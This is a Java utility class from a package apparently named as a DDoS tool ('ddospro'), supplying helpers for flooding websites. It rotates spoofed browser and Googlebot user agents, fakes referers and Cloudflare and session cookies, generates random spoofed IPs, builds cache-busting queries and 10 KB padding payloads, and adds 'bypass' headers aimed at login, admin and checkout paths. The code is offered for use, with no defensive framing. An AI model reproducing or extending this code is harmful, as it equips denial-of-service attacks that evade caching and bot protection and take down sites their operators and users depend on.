package com.mzkyzak.ddospro;

import java.util.Random;
import java.util.UUID;

public class Utils {
    private static final Random random = new Random();

    private static final String[] USER_AGENTS = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };

    private static final String[] REFERERS = {
            "https://www.google.com/", "https://www.facebook.com/",
            "https://www.youtube.com/", "https://www.twitter.com/",
            "https://www.instagram.com/", "https://www.linkedin.com/",
            "https://www.bing.com/"
    };

    private static final String[] FOCUSED_PATHS = {
            "/api/", "/admin/", "/wp-admin/", "/assets/", "/uploads/",
            "/login/", "/register/", "/dashboard/", "/config/", "/backup/",
            "/search/", "/products/", "/cart/", "/checkout/", "/account/"
    };

    private static final String[] DNS_RESOLVERS = {
            "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222",
            "8.8.4.4", "1.0.0.1", "149.112.112.112"
    };

    public static String getRandomUserAgent() {
        return USER_AGENTS[random.nextInt(USER_AGENTS.length)];
    }

    public static String getRandomReferer() {
        return REFERERS[random.nextInt(REFERERS.length)];
    }

    public static String getRandomFileName() {
        return UUID.randomUUID().toString().replace("-", "");
    }

    public static String getRandomPath() {
        return "/" + generateRandomString(10);
    }

    public static String getRandomQuery() {
        return "?t=" + System.currentTimeMillis() + "&r=" + random.nextInt(9999);
    }

    public static String getMassiveQuery() {
        StringBuilder sb = new StringBuilder("?");
        for (int i = 0; i < 50; i++) sb.append("a=");
        sb.append(System.currentTimeMillis());
        return sb.toString();
    }

    public static String getFocusedPath() {
        return FOCUSED_PATHS[random.nextInt(FOCUSED_PATHS.length)];
    }

    public static String getRandomETag() {
        return "\"" + UUID.randomUUID().toString().replace("-", "") + "\"";
    }

    public static String getRandomDate() {
        String[] months = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
        int day = 10 + random.nextInt(20);
        int year = 2020 + random.nextInt(5);
        return "Wed, " + day + " " + months[random.nextInt(12)] + " " + year + " 12:00:00 GMT";
    }

    public static String getHeavyPayload() {
        StringBuilder sb = new StringBuilder("x=");
        for (int i = 0; i < 1024 * 10; i++) sb.append("A");
        return sb.toString();
    }

    public static String getRandomDNSResolver() {
        return DNS_RESOLVERS[random.nextInt(DNS_RESOLVERS.length)];
    }

    public static String generateRandomIP() {
        return random.nextInt(256) + "." +
                random.nextInt(256) + "." +
                random.nextInt(256) + "." +
                random.nextInt(256);
    }

    public static String generateFakeCookie() {
        String[] cookies = {"__cfduid=", "cf_clearance=", "PHPSESSID=", "csrftoken=", "sessionid=", "AWSALB="};
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 3; i++) {
            sb.append(cookies[random.nextInt(cookies.length)])
                    .append(UUID.randomUUID().toString().replace("-", ""))
                    .append("; ");
        }
        return sb.toString();
    }

    private static String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }

    public static void addSecFetchHeaders(okhttp3.Request.Builder builder) {
        builder.header("Sec-Fetch-Site", "none")
                .header("Sec-Fetch-Mode", "navigate")
                .header("Sec-Fetch-User", "?1")
                .header("Sec-Fetch-Dest", "document");
    }

    public static void addBypassHeaders(okhttp3.Request.Builder builder) {
        builder.header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
                .header("Accept-Language", "en-US,en;q=0.9")
                .header("Accept-Encoding", "gzip, deflate, br")
                .header("Cache-Control", "no-cache, no-store, must-revalidate")
                .header("Pragma", "no-cache")
                .header("Expires", "0")
                .header("Upgrade-Insecure-Requests", "1");
    }
}